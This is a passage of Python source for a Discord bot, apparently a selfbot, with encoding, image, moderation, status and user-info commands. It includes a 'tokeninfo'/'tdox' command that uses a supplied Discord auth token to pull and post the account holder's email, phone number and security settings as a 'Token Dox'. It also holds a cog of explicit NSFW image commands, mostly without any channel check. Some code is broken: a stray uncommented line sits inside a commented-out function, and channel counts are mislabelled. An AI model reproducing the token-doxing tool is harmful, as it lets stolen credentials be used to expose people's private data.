    async def b32(self, ctx, t, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if t.lower() == "encode":
            m = self.format(self.b32_en(args))
            await ctx.send(f"{m}")
            return cmdused(ctx.message.content.split()[0].replace(prefix, ""))
        elif t.lower() == "decode":
            m = self.b32_de(args)
            await ctx.send(f"{m}")
            return cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @commands.command(aliases=["base64"])
    async def b64(self, ctx, t, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if t.lower() == "encode":
            m = self.format(self.b64_en(args))
            await ctx.send(f"{m}")
            return cmdused(ctx.message.content.split()[0].replace(prefix, ""))
        elif t.lower() == "decode":
            m = self.b64_de(args)
            await ctx.send(f"{m}")
            return cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @commands.command(aliases=["base85"])
    async def b85(self, ctx, t, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if t.lower() == "encode":
            m = self.format(self.b85_en(args))
            await ctx.send(f"{m}")
            return cmdused(ctx.message.content.split()[0].replace(prefix, ""))
        elif t.lower() == "decode":
            m = self.b85_de(args)
            await ctx.send(f"{m}")
            return cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @commands.command(aliases=["ascii85"])
    async def a85(self, ctx, t, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if t.lower() == "encode":
            m = self.format(self.a85_en(args))
            await ctx.send(f"{m}")
            return cmdused(ctx.message.content.split()[0].replace(prefix, ""))
        elif t.lower() == "decode":
            m = self.a85_de(args)
            await ctx.send(f"{m}")
            return cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @commands.command(aliases=['morsecode', 'morse-code'])
    async def morse(self, ctx, t, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            c = True if t == 'encode' else False
            m = self.morse_(c, args)
            await ctx.send(f"{m}")
            cmdused("morse")
        except Exception as exception:
            print(exception)

class ImageCmds(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def create_image(self, name):
        im = Image.open(r"./assets/thingrip.png")
        base = im.convert("RGBA")
        txt = Image.new('RGBA', base.size, (255, 255, 255, 0))
        fnt = ImageFont.truetype(r"./assets/font.ttf", 40)
        d = ImageDraw.Draw(base)
        d.text((80, 175), text=name, font=fnt, fill=(0, 0, 0, 255))
        out = Image.alpha_composite(base, txt)
        out.save(r"./assets/final.png")

    @commands.command(pass_context=True)
    async def rip(self, ctx, *, member: discord.Member = None):
        if await disableCmd(ctx) == 0: return
        '''``!rip (@member)``\nSends a tombstone with the nickname of the member, it's you by default'''
        member = ctx.author if not member else member
        await self.create_image(member.display_name)
        await ctx.send(file=discord.File(r"./assets/final.png"))

    @commands.command()
    async def trumptweet(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        msg = urllib.parse.quote_plus(args)
        async with aiohttp.ClientSession() as cs:
            async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username=Donald+J.+Trump&text={msg}") as r:
                res = await r.json()
                em = discord.Embed(title=f'Donald Trump Tweeted!', color=emcolor)
                em.set_image(url=res["message"])
                await ctx.send(embed=em, delete_after=delinterval)
        cmdused('tweet')   

    @commands.command(aliases=['twitter'])
    async def tweet(self, ctx, *, message: str):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        a = message.split(' ')
        msg = '+'.join(a)
        e = ctx.author.name.split(' ')
        username = '+'.join(e)
        async with aiohttp.ClientSession() as cs:
            async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={msg}") as r:
                res = await r.json()
                em = discord.Embed(title=f'{username} Tweeted!', color=emcolor)
                em.set_image(url=res["message"])
                await ctx.send(embed=em, delete_after=delinterval)
        cmdused('tweet') 

    @commands.command()
    async def baguette(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        baguettes = [
            "https://cdn.discordapp.com/attachments/522721371214577670/764351769785925702/baguette1.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351777687994388/baguette2.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351806141628446/baguette3.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351790413512714/baguette4.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351758343602196/baguette5.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351847653179462/baguette6.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351859120799754/baguette7.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351916913459210/baguette8.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351877290524682/baguette9.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351898907443230/baguette10.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351926321414164/baguette11.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351928859492352/baguette12.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351936669155348/baguette13.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351943615053844/baguette14.jpg",
            "https://cdn.discordapp.com/attachments/522721371214577670/764351949297418250/baguette15.jpg", ]

        titles = ["Baguette 🥖", "Le Baguette", "French Bread"]

        embed = discord.Embed(
            title=random.choice(titles),
            colour=emcolor
        )

        embed.set_image(url=random.choice(baguettes))
        embed.set_footer(text=footer)

        msg = await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('baguette')

    @commands.command()
    async def cat(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get('https://some-random-api.ml/img/cat')
        data = r.json()
        img = data.get('link')
        embed = discord.Embed(color=emcolor, title='Random Cat Image')
        embed.set_image(url=f"{img}")
        embed.set_footer(text=f'{footer}')
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('cat')

    @commands.command()
    async def dog(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get('https://some-random-api.ml/img/dog')
        data = r.json()
        img = data.get('link')
        embed = discord.Embed(color=emcolor, title='Random Dog Image')
        embed.set_image(url=f"{img}")
        embed.set_footer(text=f'{footer}')
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('dog')

    @commands.command()
    async def panda(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get('https://some-random-api.ml/img/panda')
        data = r.json()
        img = data.get('link')
        embed = discord.Embed(color=emcolor, title='Random Panda Image')
        embed.set_image(url=f"{img}")
        embed.set_footer(text=f'{footer}')
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('panda')

    @commands.command()
    async def fox(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get('https://some-random-api.ml/img/fox')
        data = r.json()
        img = data.get('link')
        embed = discord.Embed(color=emcolor, title='Random Fox Image')
        embed.set_image(url=f"{img}")
        embed.set_footer(text=f'{footer}')
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('fox')

    @commands.command()
    async def koala(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get('https://some-random-api.ml/img/koala')
        data = r.json()
        img = data.get('link')
        embed = discord.Embed(color=emcolor, title='Random Koala Image')
        embed.set_image(url=f"{img}")
        embed.set_footer(text=f'{footer}')
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('koala')

    @commands.command()  
    async def feed(self, ctx, user=" "): 
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/feed")
        res = r.json()
        em = discord.Embed(color=emcolor, description=f"**{user}**", timestamp=datetime.utcnow())
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        cmdused('feed')

    @commands.command()
    async def tickle(self, ctx, user=" "):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/tickle")
        res = r.json()
        em = discord.Embed(color=emcolor, description=f"**{user}**", timestamp=datetime.utcnow())
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        cmdused('tickle')

    @commands.command()
    async def slap(self, ctx, user=" "):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/slap")
        res = r.json()
        em = discord.Embed(color=emcolor, description=f"**{user}**", timestamp=datetime.utcnow())
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        cmdused('slap')

    @commands.command()
    async def hug(self, ctx, user=" "):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/hug")
        res = r.json()
        em = discord.Embed(color=emcolor, description=f"**{user}**", timestamp=datetime.utcnow())
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        cmdused('hug')

    @commands.command()
    async def smug(self, ctx, user=" "):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/smug")
        res = r.json()
        em = discord.Embed(color=emcolor, description=f"**{user}**", timestamp=datetime.utcnow())
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        cmdused('smug')

    @commands.command()
    async def pat(self, ctx, user=" "):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/pat")
        res = r.json()
        em = discord.Embed(color=emcolor, description=f"**{user}**", timestamp=datetime.utcnow())
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        cmdused('pat')

    @commands.command()
    async def kiss(self, ctx, user=" "):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/kiss")
        res = r.json()
        em = discord.Embed(color=emcolor, description=f"**{user}**", timestamp=datetime.utcnow())
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        cmdused('kiss')

class NSFWCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def anal(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/anal")
        res = r.json()
        em = discord.Embed(color=emcolor)   
        em.set_image(url=res['url'])
        await ctx.send(embed=em, delete_after=delinterval)
        cmdused('anal')

    @commands.command()
    async def erofeet(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/erofeet")
        res = r.json()
        em = discord.Embed(color=emcolor)
        em.set_image(url=res['url'])
        await ctx.send(embed=em,delete_after=delinterval)
        cmdused('erofeet')

    @commands.command()
    async def feet(self, ctx): 
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/feetg")
        res = r.json()
        em = discord.Embed(color=emcolor)
        em.set_image(url=res['url'])
        await ctx.send(embed=em,delete_after=delinterval)
        cmdused('feet')

    @commands.command()
    async def boobs(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/boobs")
        res = r.json()
        em = discord.Embed(color=emcolor)
        em.set_image(url=res['url'])
        await ctx.send(embed=em,delete_after=delinterval)
        cmdused('boobs')

    @commands.command()
    async def tits(self, ctx): 
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/tits")
        res = r.json()
        em = discord.Embed()    
        em.set_image(url=res['url'])
        await ctx.send(embed=em,delete_after=delinterval)
        cmdused('tits')

    @commands.command()
    async def pussy(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/pussy")
        res = r.json()
        em = discord.Embed(color=emcolor)
        em.set_image(url=res['url'])
        await ctx.send(embed=em,delete_after=delinterval)
        cmdused('pussy')

    @commands.command()
    async def blowjob(self, ctx): 
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/blowjob")
        res = r.json()
        em = discord.Embed(color=emcolor)
        em.set_image(url=res['url'])
        await ctx.send(embed=em,delete_after=delinterval)
        cmdused('blowjob')

    @commands.command()
    async def hentai(self, ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
        res = r.json()
        em = discord.Embed(color=emcolor)
        em.set_image(url=res['url'])
        await ctx.send(embed=em,delete_after=delinterval)

    @commands.command()
    async def lewdneko(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
        res = r.json()
        em = discord.Embed(color=emcolor)
        em.set_image(url=res['url'])
        await ctx.send(embed=em,delete_after=delinterval)
        cmdused('lewdneko')

    @commands.command()
    async def lesbian(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/les")
        res = r.json()
        em = discord.Embed(color=emcolor)
        em.set_image(url=res['url'])
        await ctx.send(embed=em,delete_after=delinterval)
        cmdused('lesbian')

class AdminCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.cmd = lambda m: cmdused(m.message.content.split(prefix)[1].split()[0])

    @commands.command(aliases=['prune'])
    @commands.guild_only()
    async def purgechat(self, ctx, amount : int):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            await ctx.channel.purge(limit=amount)
            await ctx.channel.send(f'Purged {amount} messages.')
        except:
            print(errorcol+"Error: Missing Permissions")
        self.cmd(ctx)

    @commands.command(aliases=['slowmode'])
    @commands.guild_only()
    async def setdelay(self, ctx, seconds: int, *, channel: discord.TextChannel = None):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if channel == None:
            channel = ctx.channel
        try:
            await channel.edit(slowmode_delay=seconds)
            await ctx.send(f'\\✔ Successfully changed slowmode to `{seconds}` seconds.')
        except:
            print(errorcol+"Error: Missing Permissions")
        self.cmd(ctx)

    @setdelay.error
    async def setdelay_err(self, ctx, error):
        if isinstance(error, commands.BadArgument):
            await ctx.send("\\❌ **Error**: Channel not found.", delete_after=delinterval)

    @commands.command(pass_context=True, aliases=['addrole', 'role'])
    @commands.guild_only()
    async def giverole(self, ctx, user: discord.Member, *, role: discord.Role):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            await user.add_roles(role)
            await ctx.send(f"\\✔ Given **{user.display_name}** the **{role.name}** role.", delete_after=delinterval)
        except:
            print(errorcol+"Error: Missing Permissions or user already has the role.")
        self.cmd(ctx)

    @giverole.error
    async def giverl_err(self, ctx, error):
        if isinstance(error, commands.BadArgument):
            await ctx.send(f"\\❌ **Error**: Either user or role is not found.\nUsage: `{prefix}role [@user] [role]`", delete_after=delinterval)

    @commands.command(pass_context=True, aliases=['remrole'])
    @commands.guild_only()
    async def removerole(self, ctx, user: discord.Member, *, role: discord.Role):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            await user.remove_roles(role)
            await ctx.send(f"{ctx.author.mention}, removed **{user.display_name}**'s **{role.name}** role.", delete_after=delinterval)
        except Exception as e:
            print(errorcol+"Error: Missing Permissions or user does not have the role.")
        self.cmd(ctx)
    
    @removerole.error
    async def remvrl_err(self, ctx, error):
        if isinstance(error, commands.BadArgument):
            await ctx.send(f"\\❌ **Error**: Either user or role is not found.\nUsage: `{prefix(ctx.message)}removerole [user] [role]`", delete_after=delinterval)

    @commands.command()
    @commands.guild_only()
    async def unban(self, ctx, *, member):
        if await disableCmd(ctx) == 0: return
        try:
            if '#' in str(member):
                banned_users = await ctx.guild.bans()
                member_name, member_discriminator = member.split('#')

                for ban_entry in banned_users:
                    user = ban_entry.user

                    if (user.name, user.discriminator) == (member_name, member_discriminator):
                        try:
                            await ctx.guild.unban(user)
                            await ctx.send(f"\\✔ Successfully unbanned `{user}`.", delete_after=delinterval)
                            return
                        except Exception as e:
                            await ctx.send(f"```{e}```", delete_after=delinterval)
            else:
                userid = int(member)
                user = await self.bot.fetch_user(userid)
                try:
                    await ctx.guild.unban(user)
                    await ctx.send(f"\\✔ Successfully unbanned `{user}`.", delete_after=delinterval)
                    return
                except Exception as e:
                    await ctx.send(f"```{e}```", delete_after=delinterval)
        except Exception as e:
            await ctx.send("```{}```".format(e), delete_after=delinterval)
        self.cmd(ctx)

    @commands.command()
    @commands.guild_only()
    async def ban(self, ctx, member: discord.Member, *, reason='No Reason Provided.'):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            await member.ban(reason=reason)
            await ctx.channel.send(f'Banned {member.mention}\nReason: `{reason}`', delete_after=delinterval)
        except:
            print(errorcol+'Error: No permissions to ban user.')
        self.cmd(ctx)

    @commands.command()
    @commands.guild_only()
    async def kick(self, ctx, member: discord.Member, *, reason='No Reason Provided.'):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            await member.kick(reason=reason)
            await ctx.channel.send(f'Kicked {member.mention}\nReason: `{reason}`', delete_after=delinterval)
        except:
            print(errorcol+'Error: No permissions to kick user.')
        self.cmd(ctx)

    @commands.command()
    @commands.guild_only()
    async def nukechat(self, ctx, *, channel: discord.TextChannel = None):
        if await disableCmd(ctx) == 0: return
        channel = ctx.channel if channel == None else channel
        await ctx.message.delete()
        newchannel = await channel.clone()
        await channel.delete()
        await newchannel.send('Nuked This Channel.\nhttps://imgur.com/LIyGeCR', delete_after=delinterval)
        self.cmd(ctx)

class UserCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def playing(self, ctx, *, args):#{
        await ctx.message.delete()#;
        try:#{
            await self.bot.change_presence(activity=discord.Game(name=str(args)))#;
            await ctx.send("Set playing status as `{var}`.\nNote: To reset the custom status, you must restart discord.".format(var=args), delete_after=delinterval)#;
        #}
        except Exception as err: #{
            await ctx.send("```{err}```".format(err=err), delete_after=delinterval)#;
        #}
        cmdused('playing')
    #}

    @commands.command()
    async def listening(self, ctx, *, args: str):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()#;
        try:#{
            await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=args))#;
            await ctx.send("Set listening status as `{var}`.\nNote: To reset the custom status, you must restart discord.".format(var=args), delete_after=delinterval)#;
        #}
        except Exception as err: #{
            await ctx.send("```{err}```".format(err=err), delete_after=delinterval)#;
        #}
        cmdused('listening')
    #}

    @commands.command()
    async def watching(self, ctx, *, args: str):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()#;
        try:#{
            await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=args))#;
            await ctx.send("Set watching status as `{var}`.\nNote: To reset the custom status, you must restart discord.".format(var=args), delete_after=delinterval)#;
        #}
        except Exception as err: #{
            await ctx.send("```{err}```".format(err=err), delete_after=delinterval)#;
        #}
        cmdused('watching')
    #}

    @commands.command(aliases=['streaming'])
    async def stream(self, ctx, stream_url, *, message): 
        await ctx.message.delete()
        stream = discord.Streaming(
            name=message,
            url=stream_url
        )
        await reaper.change_presence(activity=stream)
        cmdused("streaming")

    @commands.command(aliases=["statusreset", 'resstatus', 'statusres'])
    async def resetstatus(self, ctx): #{
        await ctx.message.delete()
        try:#{
            await self.bot.change_presence(status=discord.Status.online)
            await ctx.send("Reseted custom status.")
        #}
        except Exception as err: #{
            await ctx.send("```{err}```".format(err=err),delete_after=delinterval)#;
        #}
        cmdused('resetstatus')
    #}

    @commands.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
    async def _group_leaver(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for channel in reaper.private_channels:
            if isinstance(channel, discord.GroupChannel):
                await channel.leave()
        cmdused('group-leaver')

    @commands.command()
    async def iq(self, ctx, member = None):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if member == None:
            member = ctx.author.name
        iq = random.randint(12, 200)
        await ctx.send(embed=discord.Embed(title="iq amount machine", description=f"**{member}** has {iq} IQ.", color=emcolor).set_footer(text=footer))

    @commands.command(aliases=['tokinfo', 'tdox'])
    async def tokeninfo(self, ctx, *, _token):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        headers = {
            'Authorization': _token,
            'Content-Type': 'application/json'
        }
        try:
            global res, creation_date, language, user_id, avatar_id
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        except KeyError:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
        em = discord.Embed(
            title='Token Dox',
            description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})",
            color=emcolor)
        fields = [
            {'name': 'Phone', 'value': res['phone']},
            {'name': 'Flags', 'value': res['flags']},
            {'name': 'Local language', 'value': res['locale'] + f"{language}"},
            {'name': 'MFA?', 'value': res['mfa_enabled']},
            {'name': 'Verified?', 'value': res['verified']},
        ]
        for field in fields:
            if field['value']:
                em.add_field(name=field['name'], value=field['value'], inline=False)
                em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
        return await ctx.send(embed=em, delete_after=delinterval)

    @commands.command()
    async def dick(self, ctx, *, user = None):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if user is None:
            user = ctx.author.name
        await ctx.send(embed=discord.Embed(title="dick size machine", description=f"{user}'s dick size\n8"+"="*random.randint(1,15)+"D", color=emcolor).set_footer(text=footer))

    @commands.command(aliases=['whoisdm'])
    async def userinfodm(self, ctx, user = "none"):
        if await disableCmd(ctx) == 0: return
        try:
            if user == "none" or str(reaper.user.id) in str(user).lower(): 
                user = ctx.author
            else: 
                await ctx.message.delete()
                m = await ctx.send("**Please Wait**\nFetching user...")
                def get_user_from_global_cache(user):
                    for u in self.bot.users:
                        if user == u.name:
                            return user
                user = user
                if type(user) != discord.Member:
                    user = str(user)
                    r = re.compile(r"@(.*#\d{4})|(\d{18})")
                    r = r.search(user)
                    if r:
                        if r.group(2):
                            user = int(r.group(2))
                        elif r.group(1):
                            user = r.group(1)
                if type(user) == str and type(user) != int: user = ctx.guild.get_member_named(user)
                if type(user) == str: user = get_user_from_global_cache(user)
                elif type(user) == int: user = await self.bot.fetch_user(user)
            member=user
            embed = discord.Embed(
                description=f'Info for user: {member.mention}',
                colour=emcolor
            )
            if isinstance(ctx.channel, discord.TextChannel):
                await ctx.message.delete()
                return print(errorcol+"This command is only able to be used in DMs and Group Chats. For servers, use \"{}userinfo\" instead".format(prefix))
            else:
                fields = [
                    {'name': "Username", 'value': f"{member.name}#{member.discriminator}"},
                    {'name': "ID", 'value': member.id},
                    {'name': "Profile Picture", 'value': f'[Direct Link]({member.avatar_url})'},
                    {'name': "Created At", 'value': member.created_at.strftime("%d/%m/%Y at %H:%M:%S UTC")}
                ]

                for field in fields:
                    if field['value']:
                        embed.add_field(name=field['name'], value=field['value'], inline=True)

            embed.set_thumbnail(url=member.avatar_url)
            embed.set_author(name="User Info",  icon_url=ctx.author.avatar_url)
            embed.set_footer(text=footer)

            await ctx.send(embed=embed, delete_after=delinterval)
            try:
                await m.delete()
                await ctx.message.delete()
            except:
                await ctx.message.delete()
        except Exception as e:
            print(e)
        cmdused("userinfodm")

    @commands.command(aliases=['whois'])
    @commands.guild_only()
    async def userinfo(self, ctx, *, user: discord.Member = "None_!__"):
        if await disableCmd(ctx) == 0: return
        try:
            if user == "None_!__" or user == self.bot.user:
                user = ctx.author
            member=user
            embed = discord.Embed(
                description=f'Info for user: {member.mention}',
                colour=emcolor
            )
            perm = [str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]]
            acknowledgements = "No Acknowledgements"
            if len(user.roles) > 1:
                role_string = str(', '.join([f"**`{r.name}`**" for r in user.roles][1:]))
            else:
                role_string = 'No Roles'
            if 'Manage Guild' in perm:
                acknowledgements = "Server Manager"
            if 'Administrator' in perm:
                perm_string = 'All Permissions'
                perm_string = str(', '.join(perm))\
                    .replace("Use Voice Activation, ", "")\
                    .replace("Add Reactions, ", "")\
                    .replace("Send Tts Messages, ", "")\
                    .replace("Read Messages, ", "")\
                    .replace("Send Messages, ", "")\
                    .replace("Connect, ", "")\
                    .replace("Speak, ", "")\
                    .replace("Change Nickname, ", "")\
                    .replace("Use Voice Activation, ", "")\
                    .replace("Stream, ", "")\
                    .replace("Priority Speaker, ", "")\
                    .replace("Embed Links, ", "")\
                    .replace("External Emojis, ", "")\
                    .replace("Create Instant Invite, ", "")\
                    .replace("Attach Files, ", "")\
                    .replace("Embed Links, ", "")\
                    .replace("Read Message History, ", "")
                acknowledgements = "Server Admin"
            else:
                perm_string = ', '.join(perm)
            if user.id == ctx.guild.owner_id:
                acknowledgements = "Server Owner"
            if len(user.roles) > 1:
                toprole = user.top_role.mention
            else:
                toprole = "No Roles"
            fields = [
                {'name': 'Username', 'value': f'{user}'},
                {'name': 'ID', 'value': str(user.id)},
                {'name': "Profile Picture", 'value': f'[Direct Link]({user.avatar_url})'},
                {'name': 'Top Role', 'value': toprole},
                {'name': "Is Bot?", 'value': f"{user.bot}"},
                {'name': "Role Count", 'value': f'{len(user.roles) -1}'},
                {'name': "Joined Server At", 'value': user.joined_at.strftime("%d/%m/%Y at %H:%M:%S UTC")},
                {'name': "Acknowledgements", 'value': f"{acknowledgements}"},
                {'name': "Created At", 'value': user.created_at.strftime("%d/%m/%Y at %H:%M:%S UTC")}
            ]
            for field in fields:
                if field['value']:
                    embed.add_field(name=field['name'], value=field['value'], inline=True)
            embed.add_field(name="Roles", value=role_string, inline=False)
            embed.add_field(name="Key Permissions", value=perm_string, inline=False)
            embed.set_thumbnail(url=member.avatar_url)
            embed.set_author(name="User Info",  icon_url=ctx.author.avatar_url)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=delinterval)
            try:
                await ctx.message.delete()
            except:
                pass
        except Exception as e:
            print(e)
        cmdused("userinfo")

    @commands.command(aliases=['gayrate'])
    async def howgay(self, ctx, *, args = None):
        if await disableCmd(ctx) == 0: return
        if args == None:
            args = ctx.author.name
        await ctx.message.delete()
        await ctx.send(embed=discord.Embed(title="gay rate machine", description=f"{args} is {random.randint(1,100)}% gay.", color=emcolor).set_footer(text=footer), delete_after=delinterval)
        cmdused("howgay")

    @commands.command(aliases=['simprate'])
    async def howsimp(self, ctx, *, args = None):
        if await disableCmd(ctx) == 0: return
        if args == None:
            args = ctx.author.name
        await ctx.message.delete()
        await ctx.send(embed=discord.Embed(title="simp rate machine", description=f"{args} is {random.randint(1,100)}% a simp.", color=emcolor).set_footer(text=footer), delete_after=delinterval)
        cmdused("howsimp")

    # @commands.command(aliases=['av', 'pfp'])
    # async def avatar(self, ctx, *, member: discord.Member):
        if await disableCmd(ctx) == 0: return
        # await ctx.message.delete()
        # em = discord.Embed(
            # title="Avatar for "+str(member),
            # description="[Direct Link]({})".format(member.avatar_url),
            # color=emcolor
            # )
        # em.set_footer(text=footer)
        # await ctx.send(embed=em)
        # cmdused("avatar")

    @commands.command(aliases=['av', 'pfp'])
    async def avatar(self, ctx, *, user=None):
        if await disableCmd(ctx) == 0: return
        try:
            if user == None: 
                user = ctx.author
            else: 
                def get_user_from_global_cache(user):
                    for u in self.bot.users:
                        if user == u.name:
                            return user
                user = user
                if type(user) != discord.Member:
                    user = str(user)
                    r = re.compile(r"@(.*#\d{4})|(\d{18})")
                    r = r.search(user)
                    if r:
                        if r.group(2):
                            user = int(r.group(2))
                        elif r.group(1):
                            user = r.group(1)
                if type(user) == str and type(user) != int: user = ctx.guild.get_member_named(user)
                if type(user) == str: user = get_user_from_global_cache(user)
                elif type(user) == int: user = await self.bot.fetch_user(user)
        except:
            user = ctx.author
        em = discord.Embed(
            title="Avatar for "+str(user.name),
            description="[Direct Link]({})".format(user.avatar_url),
            color=emcolor,
            timestamp=datetime.utcnow())\
            .set_footer(text=footer)\
            .set_image(url=user.avatar_url)
        await ctx.send(embed=em, delete_after=delinterval)
        await ctx.message.delete()
        cmdused("avatar")

    @commands.command(aliases=['serverinfo'])
    @commands.guild_only()
    async def serverstats(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()

        embed = discord.Embed(
            title='Server Info', description=f'Info for Guild: **{ctx.guild}**', colour=emcolor)
        if ctx.guild.features == []:
            perk_strng = 'No Perks'
        else:
            perk_strng = ', '.join([str(p).replace("_", " ").title() for p in ctx.guild.features if p[1]])
        embed.set_thumbnail(url=ctx.guild.icon_url)
        embed.add_field(name="Guild Name", value=f"{ctx.guild.name}", inline=True)
        embed.add_field(name='Roles', value=f'{len(ctx.guild.roles)}')
        embed.add_field(name='Guild Logo', value=f'[Direct Link]({ctx.guild.icon_url})', inline=True)
        embed.add_field(name='Members', value=f"{ctx.guild.member_count}")
        embed.add_field(name='Owner', value=f'<@!{ctx.message.author.guild.owner_id}>', inline=True)
        embed.add_field(name='Channels', value=f'Voice: {len(ctx.guild.text_channels)}\nText: {len(ctx.guild.voice_channels)}')
        embed.add_field(name="Guild ID", value=ctx.guild.id, inline=True)
        embed.add_field(name="Created At", value=ctx.guild.created_at.strftime("%d/%m/%Y at %H:%M:%S UTC"), inline=True)
        embed.add_field(name='Region', value=ctx.guild.region, inline=True)
        embed.add_field(name='VIP Perks', value=perk_strng)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('serverinfo')

class MathCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def randomnum(self, ctx, num1 : int, num2 : int):
        if await disableCmd(ctx) == 0: return
        embed = discord.Embed(
